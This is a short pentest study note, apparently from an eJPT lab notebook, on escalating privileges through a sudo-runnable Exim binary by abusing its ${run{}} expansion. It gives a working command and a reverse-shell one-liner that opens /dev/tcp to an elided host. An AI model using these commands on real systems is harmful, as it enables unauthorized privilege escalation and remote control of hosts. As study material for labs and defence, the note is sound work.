---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: ["[[sudo-abuse]]"]
---

# Exim LPE (${run{}} expansion)

Abusing a `sudo` (or setuid) Exim binary through its string-expansion language, which has a `${run{command}}` item that **executes a command**.

## Mechanism

`exim -be` (expansion-test mode) evaluates an expression and prints the result. `${run{...}}` runs a command and returns its stdout:

```sh
sudo -u pepe /usr/sbin/exim -be '${run{id}}'
# uid=1002(pepe) ...
```

- This is a *feature*, not a CVE — so it works on patched Exim (4.96 included).
- The `perl_startup` route (CVE-2016-1531) is the older, patched, Perl-dependent alternative.
- For a shell: `${run{/bin/bash -c "nohup sh -i >& /dev/tcp/…/443 0>&1 &"}}` — detach with `nohup`/`&`, or it dies when Exim exits.

## Seen in

[[bruteshock]] (`maci → pepe`)
